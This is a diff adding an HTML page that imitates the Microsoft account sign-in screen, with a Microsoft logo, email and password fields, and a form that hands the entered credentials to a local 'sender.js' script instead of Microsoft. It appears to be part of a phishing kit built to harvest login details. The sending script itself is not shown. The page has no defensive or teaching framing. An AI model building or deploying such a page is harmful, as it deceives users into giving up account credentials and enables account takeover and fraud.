@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="icon" type="image/svg+xml" sizes="21x21" href="assets/img/favicon16.svg">
+    <link rel="icon" type="image/svg+xml" sizes="43x43" href="assets/img/favicon32.svg">
+    <link rel="icon" type="image/svg+xml" sizes="240x240" href="assets/img/favicon%20180.svg">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css">
+    <link rel="stylesheet" href="https://maxcdn.icons8.com/fonts/line-awesome/1.1/css/line-awesome.min.css">
+    <link rel="stylesheet" href="assets/css/styles.min.css">
+</head>
+
+    <div id="loginForm"  class="form"><img id="image" src="assets/img/microsoft_logo.svg">
+    
+        <form onsubmit="return sender()">   
+            <p id="signIn" class="field">Sign in</p><h5 id="result"></h5>
+            <input type="email" id="email" class="field" placeholder="Email, phone, or Skype" />
+            <hr style="border: 1px solid #ffffff; margin: 10px 0;">
+                    
+            <p><input type="password" id="password" placeholder="Password"></p>
+            <p id="keepMe">Keep me signed in</p><input type="checkbox" id="cbRemember">
+            <p id="ForgodPwd"><a href="#">Forgot password?</a></p>
+            <p id="btnPlace" class="field"> <button class="firstNext next" type="submit" id="btnSend" >Next</button> </p>
+           
+        </form>
+        <script src="sender.js"></script>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    </div>
+    <div id="footer" style="height: 36px;">
+        <div id="terms" style="float: left;width: 84px;">
+            <p style="font-size: 13px;text-align: left;">Terms of use</p>
+        </div>
+        <div style="float: left;width: 105px;">
+            <p style="font-size: 12px;">Privacy &amp; cookies</p>
+        </div>
+        <div style="float: left;width: 24px;">
+            <p style="font-size: 12px;">•••<br></p>
+        </div>
+    </div>
+    
+    
+</body>
+
+</html>
